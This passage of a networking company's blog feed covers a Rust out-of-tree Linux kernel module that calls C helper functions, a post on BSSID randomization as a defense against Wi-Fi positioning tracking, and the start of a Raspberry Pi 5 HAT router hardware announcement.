198)">"GPL"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">MODULE_AUTHOR</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Jeremy Goldberger"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">MODULE_DESCRIPTION</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"A simple helper module."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-Rust language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">// SPDX-License-Identifier: GPL-2.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">//! Inspired by Rust hello world example by Adrea Righi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">use</span><span class="token plain"> </span><span class="token namespace">kernel</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token namespace">prelude</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property">module!</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">type</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token class-name">ModuleExample</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"oot_example"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    author</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Jeremy Goldberger"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    description</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Rust external module example"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    license</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"GPL"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token type-definition class-name">ModuleExample</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">impl</span><span class="token plain"> </span><span class="token namespace">kernel</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token class-name">Module</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token class-name">ModuleExample</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">init</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">_module</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol" style="color:rgb(248, 248, 242)">'static</span><span class="token plain"> </span><span class="token class-name">ThisModule</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">Self</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token macro property">pr_info!</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Hello from Rust\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token macro property">pr_info!</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"The current time according to C is {}.\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">rust_ktime_get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token macro property">pr_info!</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"The current linux version according to C is {}.\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">rust_linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token class-name">Ok</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token class-name">ModuleExample</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">rust_ktime_get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i64</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// Note that we don't need to define ktime_get() in an extern block anywhere;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// it was already done in bindgen! Even if it wasn't, we could add whatever</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// header we wanted to bindings_helper, and we could use it without messing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// up the kernel ABI.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsafe</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"> </span><span class="token namespace">kernel</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token namespace">bindings</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token function" style="color:rgb(80, 250, 123)">ktime_get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">extern</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"C"</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// We define this extern block ourselves. Because it's a helper function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// that doesn't exist in the Linux kernel, bindgen wouldn't be able</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// to generate it without doing some weird stuff.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token namespace">core</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token namespace">ffi</span><span class="token namespace punctuation" style="color:rgb(248, 248, 242)">::</span><span class="token plain">c_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">rust_linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsafe</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>There is already a <a href="https://github.com/torvalds/linux/blob/master/rust/kernel/time.rs" target="_blank" rel="noopener noreferrer">ktime abstraction</a> written for Rust. I was running 6.9 here, so it wasn't available here. That abstraction leverages Rust types to make it more robust, a common theme in abstractions more complex than the ones above.</p></div></div>
<p>Running the module in a qemu instance:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">helpers.ko  rust_module.ko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ uname -r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6.9.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ lsmod</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module                  Size  Used by</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ sudo insmod rust_module.ko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">insmod: ERROR: could not insert module rust_module.ko: Unknown symbol in module</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ sudo insmod helpers.ko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ sudo insmod rust_module.ko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ lsmod</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module                  Size  Used by</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rust_module            12288  0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">helpers                12288  1 rust_module</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ubuntu@ubuntu-24-cloud-image:~$ sudo dmesg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[   37.728226] rust_module: loading out-of-tree module taints kernel.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[   37.729919] rust_module: Unknown symbol linux_version_code (err -2)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[   62.071684] oot_example: Hello from Rust</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[   62.073836] oot_example: The current time according to C is 62047385799.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[   62.074243] oot_example: The current linux version according to C is 395520.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Note that the first time we tried to load the module, it threw an error because our <code>helpers</code> module wasn't loaded. The second time, it loaded correctly, since it found the <code>linux_version_code</code> symbol in our helper module. Additionally, when we ran <code>lsmod</code>, we saw that <code>helpers</code> was listed as a dependency of <code>rust_module</code>.</p>
<p>Now, we have an external module written in Rust, but we can make full use of existing C infrastructure even if it's not baked into the kernel yet! By leveraging external modules, we can start benefiting from Rust's safety features in kernel development without waiting for full mainline support. The rapid development of Rust support in the Linux kernel means that many of these workarounds will become unnecessary over time. As more subsystems gain native Rust abstractions, writing Rust kernel modules will become increasingly straightforward and powerful.</p>
<p>The potential for Rust in the Linux kernel is vast, and we're just at the beginning. Whether you're a seasoned kernel developer or new to systems programming like I am, now is an exciting time to get involved and contribute to open-source development.</p>]]></content>
        <author>
            <name>Jeremy Goldberger</name>
            <uri>https://github.com/jgoldberger26</uri>
        </author>
        <category label="rust" term="rust"/>
        <category label="kernel" term="kernel"/>
        <category label="linux" term="linux"/>
        <category label="wifi" term="wifi"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[BSSID Randomization]]></title>
        <id>https://www.supernetworks.org/pages/blog/bssid-randomization</id>
        <link href="https://www.supernetworks.org/pages/blog/bssid-randomization"/>
        <updated>2024-05-31T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[How Does WiFi Location Positioning & Tracking Work?]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-does-wifi-location-positioning--tracking-work">How Does WiFi Location Positioning &amp; Tracking Work?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#how-does-wifi-location-positioning--tracking-work" class="hash-link" aria-label="Direct link to How Does WiFi Location Positioning &amp; Tracking Work?" title="Direct link to How Does WiFi Location Positioning &amp; Tracking Work?">​</a></h2>
<p>All Apple Smartphones and Laptops as well as Google Devices passively collect Access Point Names (the SSID) and their hardware address (the BSSID), and they then tag it with the GPS location. With billions of customers, tech giants have been able to build databases that contain the physical position of almost every access point in the world.</p>
<p>Researchers from the University of Maryland published that the privacy features in the public APIs were insufficient to protect the privacy of individuals.
<a href="https://www.cs.umd.edu/~dml/papers/wifi-surveillance-sp24.pdf" target="_blank" rel="noopener noreferrer">See the paper from Erik Rye, Dave Levin for the details: "Surveilling the Masses with Wi-Fi-Based Positioning Systems" </a></p>
<p>Krebs On Security has a through review of the issue: <a href="https://krebsonsecurity.com/2024/05/why-your-wi-fi-router-doubles-as-an-apple-airtag/" target="_blank" rel="noopener noreferrer">"Why Your Wi-Fi Router Doubles as an Apple AirTag"</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-impact-on-privacy">What Is the Impact On Privacy?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#what-is-the-impact-on-privacy" class="hash-link" aria-label="Direct link to What Is the Impact On Privacy?" title="Direct link to What Is the Impact On Privacy?">​</a></h2>
<p>When traveling, access points will reveal their updated location to the general public, who can query the APIs and trick them to reveal location information. It also means that this feature could be used to stalk someone if knowing the SSID and BSSID of their router, to find their new location after they move homes for example. Apple and Google have since added some hardening to help mitigate the attack but the risks still largely remain.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-does-this-data-look-like">What does this data look like?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#what-does-this-data-look-like" class="hash-link" aria-label="Direct link to What does this data look like?" title="Direct link to What does this data look like?">​</a></h2>
<p>The BSSID and SSID data is not private and available in Beacons and Probe Responses, which end up in the data used by Apple and Google to collect positioning information.</p>
<p><img decoding="async" loading="lazy" alt="image" src="https://www.supernetworks.org/pages/assets/images/wireshark-bssid-rand-e93c539fd22ae27bfd8b92e82b27b008.png" width="1572" height="850" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-bssid-randomization">What is BSSID Randomization?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#what-is-bssid-randomization" class="hash-link" aria-label="Direct link to What is BSSID Randomization?" title="Direct link to What is BSSID Randomization?">​</a></h2>
<p>BSSID Randomization is assigning a random MAC address to the Access Point.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-enable-bssid-randomization">Why Enable BSSID Randomization?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#why-enable-bssid-randomization" class="hash-link" aria-label="Direct link to Why Enable BSSID Randomization?" title="Direct link to Why Enable BSSID Randomization?">​</a></h2>
<p>When this happens, the position databases no longer link an access point between locations. The databases can not be queried with only the SSID Name, so the position of the AP will be protected.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-_nomap-isnt-enough-">Why _nomap Isn't Enough ?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#why-_nomap-isnt-enough-" class="hash-link" aria-label="Direct link to Why _nomap Isn't Enough ?" title="Direct link to Why _nomap Isn't Enough ?">​</a></h2>
<p>Apple and Google have added a feature, where if the SSID name has "_nomap" appended in the name, they will not include it in their database. This does not prevent companies that want to collect this information from collecting it anyway. It's also unrealistic for users to change their SSID name because they have to reconfigure all of their devices, which is a non-starter for most people with busy lives.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-to-enable-bssid-randomization-with-spr-">How to Enable BSSID Randomization with SPR ?<a href="https://www.supernetworks.org/pages/blog/bssid-randomization#how-to-enable-bssid-randomization-with-spr-" class="hash-link" aria-label="Direct link to How to Enable BSSID Randomization with SPR ?" title="Direct link to How to Enable BSSID Randomization with SPR ?">​</a></h2>
<p>In the 3.13 release we have added a UI option to randomize the MAC address on startup. This supports both APs and interfaces working as wireless clients for internet uplink. It will assign a random address using the specified locally administered OUI bit. A user can also pick a common OUI from common-place routers to cloak with instead.</p>
<p><img decoding="async" loading="lazy" alt="image" src="https://www.supernetworks.org/pages/assets/images/bssid-rand-dd3563dde347f9b544b3363ba1877a7a.png" width="1312" height="966" class="img_ev3q"></p>
<h2></h2>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="wifi positioning" term="wifi positioning"/>
        <category label="privacy" term="privacy"/>
        <category label="tracking" term="tracking"/>
        <category label="apple" term="apple"/>
        <category label="google" term="google"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[PI5 Hats and More, Unleashing the Power of Modular Router Hardware]]></title>
        <id>https://www.supernetworks.org/pages/blog/pi5-hardware-2024</id>
        <link href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024"/>
        <updated>2024-05-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Modular Router Hardware]]></summary>
        <content type="html"><![CDATA[<div style="display:flex;justify-content:center;align-items:center"><img src="https://www.supernetworks.org/pages/assets/images/logopuzzle-02d5bc1d39938265e169b7df32ba4f65.png" style="width:50%"></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="modular-router-hardware">Modular Router Hardware<a href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024#modular-router-hardware" class="hash-link" aria-label="Direct link to Modular Router Hardware" title="Direct link to Modular Router Hardware">​</a></h2>
<p>I'm excited to announce that Supernetworks will be releasing Compute Module based and Pi5 Expansion HAT based access points. The HATs and Compute Modules are expected to be generally available this summer.</p>
<p>The second tenant of Sustainability is Reuse. Companies like <a href="https://frame.work/" target="_blank" rel="noopener noreferrer">Framework</a> have been spearheading the charge towards a better form of computing by building upgradable laptops and soon other devices.</p>
<p>With what the Raspberry Pi Foundation offers people, we are able to bring some of the benefits of modular computing to Access Points as well. Modularity takes ownership one step further, letting people reuse the hardware for other projects, and upgrade it to make it powerful, without any soldering required.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-raspberry-pis-rock">Why Raspberry Pis Rock<a href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024#why-raspberry-pis-rock" class="hash-link" aria-label="Direct link to Why Raspberry Pis Rock" title="Direct link to Why Raspberry Pis Rock">​</a></h2>
<p>For us it's been easy to admire the Raspberry Pi community in particular. They're not perfect, but across the board,
these devices all the way from Wales are highly capable. With the support of the community, Ubuntu, and many other people, software support for them is generally good for quality, security, and keeping current with the innovation that happens on Linux every single day.</p>
<p>When we started building Supernetworks, people on forums would say PIs even with adapters would be too slow for a router and can't push past 100mbps, but we quickly found that to be nonsense, and were able to max out USB3 dongles for speeds over 650 Mbps with WiFi 5 and hit line speed (1Gbps) over the built-in ethernet as well as a USB3 Ethernet adapter. With WiFi 6 dongles, the speeds got even faster. All it took was some IRQ balancing to keep packet processing, USB3, and the built-in ethernet from thrashing the same core on interrupts. The dongles are key because although the PIs have a built-in wifi card, it does not make a great Access Point. At the time the built in card was missing WPA3 support, still has a limited internal antenna, and still today has no support for AP/VLAN for isolation.</p>
<p>One of the key limitations of using only a single USB3 WiFi dongle is that it is single-band. With the PI5 and HATs we can address this.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-pi5-hats">The PI5 Hats<a href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024#the-pi5-hats" class="hash-link" aria-label="Direct link to The PI5 Hats" title="Direct link to The PI5 Hats">​</a></h2>
<p>Together with design firms we've been able to iterate with PI5s to turn them into dual-band/tri-band devices. The Pi5 HATs allow expanding a PI5 with PCI Express to add devices. To fully power Mediatek MT7915/6 cards we needed a custom HAT that could drive more power.</p>
<p><img decoding="async" loading="lazy" alt="PI5 Hat" src="https://www.supernetworks.org/pages/assets/images/pi5hatA-c7ba0e20a6545ba0bb2349771804e827.png" width="1024" height="815" class="img_ev3q"></p>
<p>The HATs sit on top of the Pi5 and connect over the GPIO pins for power and the FPC cable for PCI.</p>
